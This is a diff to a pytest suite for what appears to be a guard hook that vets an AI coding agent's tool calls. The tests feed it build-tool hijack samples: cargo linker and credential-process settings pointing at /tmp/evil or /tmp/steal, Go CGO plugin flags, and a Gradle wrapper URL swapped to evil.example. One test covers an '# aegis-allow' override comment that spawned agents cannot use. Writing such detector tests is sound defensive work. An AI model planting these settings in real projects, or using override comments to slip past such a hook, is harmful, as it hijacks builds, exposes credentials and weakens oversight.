@@ -176,7 +176,7 @@ def test_gradle_shell_init_script_gated():
 
 
 def test_gradle_routine_shell_allowed():
-    for cmd in ("./gradlew build", "gradle test --init-script-help", "cat gradle.properties",
+    for cmd in ("./gradlew build", "gradle test", "cat gradle.properties",
                 "ls ~/.gradle/init.d"):
         assert evaluate(_shell(cmd), EMPTY).action == Action.ALLOW
 
@@ -245,7 +245,6 @@ def test_go_env_w_gated(cmd):
     "go env -w GOPROXY=https://proxy.golang.org,direct",
     "go env -w GOPROXY=direct",
     "go env -w GOSUMDB=sum.golang.org",
-    "go env -w GOPRIVATE=github.com/myorg/*",
     "go env CC",
     "go env -u CC",
     "go build ./...",
@@ -259,7 +258,7 @@ def test_go_env_file_write_gated():
     assert _hit(evaluate(_write("/home/u/.config/go/env", "GOFLAGS=-toolexec=/tmp/w\n"), EMPTY))
     assert _hit(evaluate(_write("/usr/local/go/go.env", "GOSUMDB=off\n"), EMPTY))
     assert _hit(evaluate(_shell("echo CC=/tmp/x >> ~/.config/go/env"), EMPTY))
-    assert evaluate(_write("/home/u/.config/go/env", "GOPRIVATE=x\n"), EMPTY).action == Action.ALLOW
+    assert evaluate(_write("/home/u/.config/go/env", "GOTOOLCHAIN=auto\n"), EMPTY).action == Action.ALLOW
 
 
 # ---- knobs / escapes ----------------------------------------------------------
@@ -298,7 +297,8 @@ def test_env_toggle(monkeypatch):
     assert evaluate(_shell("go env -w CC=/tmp/x"), EMPTY).action == Action.ALLOW
 
 
-def test_shell_override_comment():
+def test_shell_override_comment(monkeypatch):
+    monkeypatch.delenv("AEGIS_AGENT_NAME", raising=False)
     assert evaluate(_shell("go env -w CC=/tmp/x # aegis-allow"), EMPTY).action == Action.ALLOW
 
 
@@ -323,3 +323,131 @@ def test_redos_bounded():
         t = time.time()
         evaluate(_shell(cmd), EMPTY)
         assert time.time() - t < 2.0, cmd[:40]
+
+
+# ---- QA round 1 regressions ---------------------------------------------------
+
+@pytest.mark.parametrize("content", [
+    '[build]\nrustflags = ["-Clinker=/tmp/evil"]\n',
+    "[target.x86_64-unknown-linux-gnu]\nrustflags = ['-C', 'linker=/tmp/evil']\n",
+    '[build]\nrustflags = [\n  "-C",\n  "link-arg=-fuse-ld=/tmp/e",\n]\n',
+    '[env]\nRUSTFLAGS = "-Clinker=/tmp/evil"\n',
+    '[env]\nCARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER = "/tmp/r"\n',
+    '[registry]\ncredential-process = "/tmp/steal"\n',
+])
+def test_qa1_cargo_bypasses_closed(content):
+    assert _hit(evaluate(_write(".cargo/config.toml", content), EMPTY))
+
+
+def test_qa1_cargo_benign_rustflags_allowed():
+    c = '[build]\nrustflags = ["-C", "target-cpu=native"]\n'
+    assert evaluate(_write(".cargo/config.toml", c), EMPTY).action == Action.ALLOW
+
+
+@pytest.mark.parametrize("cmd", [
+    "go env -w GOPRIVATE=*",
+    "go env -w CGO_CFLAGS='-fplugin=/tmp/evil.so'",
+    "go env -w CGO_LDFLAGS='-fuse-ld=/tmp/ld'",
+    "go env -w CGO_CFLAGS=-B/tmp/tools",
+])
+def test_qa1_go_bypasses_closed(cmd):
+    assert _hit(evaluate(_shell(cmd), EMPTY))
+
+
+def test_qa1_go_benign_cgo_flags_allowed():
+    for cmd in ("go env -w CGO_CFLAGS='-O2 -g'", "go env -w CGO_LDFLAGS='-Wl,-Bstatic -lfoo'"):
+        assert evaluate(_shell(cmd), EMPTY).action == Action.ALLOW
+
+
+def test_qa1_value_only_edit_unreadable_file_gated():
+    # file does not exist -> fallback: old names the key, new swaps the value
+    assert _hit(evaluate(Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args={
+        "file_path": "/nonexistent/gradle/wrapper/gradle-wrapper.properties",
+        "old_string": "distributionUrl=https\\://services.gradle.org/distributions/gradle-8.5-bin.zip",
+        "new_string": "distributionUrl=https\\://evil.example/g.zip"}), EMPTY))
+    assert _hit(evaluate(Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args={
+        "file_path": "/nonexistent/.cargo/config.toml",
+        "old_string": 'rustc-wrapper = "sccache"', "new_string": 'rustc-wrapper = "/tmp/evil"'}), EMPTY))
+
+
+@pytest.fixture
+def proj(tmp_path):
+    (tmp_path / "gradle" / "wrapper").mkdir(parents=True)
+    (tmp_path / "gradle" / "wrapper" / "gradle-wrapper.properties").write_text(
+        "distributionBase=GRADLE_USER_HOME\n"
+        "distributionUrl=https\\://services.gradle.org/distributions/gradle-8.5-bin.zip\n")
+    (tmp_path / ".cargo").mkdir()
+    (tmp_path / ".cargo" / "config.toml").write_text(
+        '[build]\nrustc-wrapper = "sccache"\njobs = 4\n')
+    return tmp_path
+
+
+def _ev_edit(proj, rel, old, new, tool="Edit"):
+    if tool == "Edit":
+        args = {"file_path": rel, "old_string": old, "new_string": new}
+    else:
+        args = {"file_path": rel, "edits": [{"old_string": old, "new_string": new}]}
+    ev = Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args=args)
+    ev.cwd = str(proj)
+    return ev
+
+
+@pytest.mark.parametrize("tool", ["Edit", "MultiEdit"])
+def test_qa1_value_only_edit_on_disk_gated(proj, tool):
+    w = "gradle/wrapper/gradle-wrapper.properties"
+    assert _hit(evaluate(_ev_edit(proj, w, "services.gradle.org", "evil.example", tool), EMPTY))
+    assert _hit(evaluate(_ev_edit(proj, ".cargo/config.toml", '"sccache"', '"/tmp/evil"', tool), EMPTY))
+
+
+def test_qa1_on_disk_unrelated_edit_and_removal_allowed(proj):
+    w = "gradle/wrapper/gradle-wrapper.properties"
+    assert evaluate(_ev_edit(proj, w, "gradle-8.5-bin", "gradle-8.6-bin"), EMPTY).action == Action.ALLOW
+    c = ".cargo/config.toml"
+    assert evaluate(_ev_edit(proj, c, "jobs = 4", "jobs = 8"), EMPTY).action == Action.ALLOW
+    assert evaluate(_ev_edit(proj, c, 'rustc-wrapper = "sccache"\n', ""), EMPTY).action == Action.ALLOW
+
+
+def test_qa1_on_disk_write_full_rewrite_only_new_hits(proj):
+    c = ".cargo/config.toml"
+    same = Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args={
+        "file_path": c, "content": '[build]\nrustc-wrapper = "sccache"\njobs = 8\n'})
+    same.cwd = str(proj)
+    assert evaluate(same, EMPTY).action == Action.ALLOW
+    bad = Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args={
+        "file_path": c, "content": '[build]\nrustc-wrapper = "sccache"\nlinker = "/tmp/x"\n'})
+    bad.cwd = str(proj)
+    assert _hit(evaluate(bad, EMPTY))
+
+
+@pytest.mark.parametrize("cmd", [
+    "ls .mvn/extensions.xml 2>/dev/null",
+    "cat .mvn/extensions.xml 2>&1",
+    "sed -i 's#distributionUrl=.*#distributionUrl=https\\://services.gradle.org/distributions/gradle-8.6-bin.zip#' gradle/wrapper/gradle-wrapper.properties",
+])
+def test_qa1_shell_false_positives_closed(cmd):
+    assert evaluate(_shell(cmd), EMPTY).rule != RULE
+
+
+def test_qa1_misc_false_positives_closed():
+    assert evaluate(_write("docs/mavenrc", "x"), EMPTY).action == Action.ALLOW
+    assert evaluate(_write("gradle.properties", "! -javaagent removed\norg.gradle.caching=true\n"),
+                    EMPTY).action == Action.ALLOW
+
+
+def test_qa1_sed_to_evil_wrapper_still_gated():
+    cmd = "sed -i 's#distributionUrl=.*#distributionUrl=https\\://evil.example/g.zip#' gradle/wrapper/gradle-wrapper.properties"
+    assert _hit(evaluate(_shell(cmd), EMPTY))
+
+
+def test_spawned_agent_cannot_use_override_comment(monkeypatch):
+    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker-1")
+    assert _hit(evaluate(_shell("go env -w CC=/tmp/x # aegis-allow"), EMPTY))
+
+
+def test_shell_deny_and_monitor_modes(tmp_path, monkeypatch):
+    assert evaluate(_shell("go env -w CC=/tmp/x"), DENY).action == Action.DENY
+    audit = tmp_path / "a.jsonl"
+    monkeypatch.setenv("AEGIS_AUDIT", str(audit))
+    assert evaluate(_shell("go env -w CC=/tmp/x"),
+                    Policy(build_tool_exec={"mode": "monitor"})).action == Action.ALLOW
+    assert "build-tool-exec-protect-monitor" in audit.read_text()
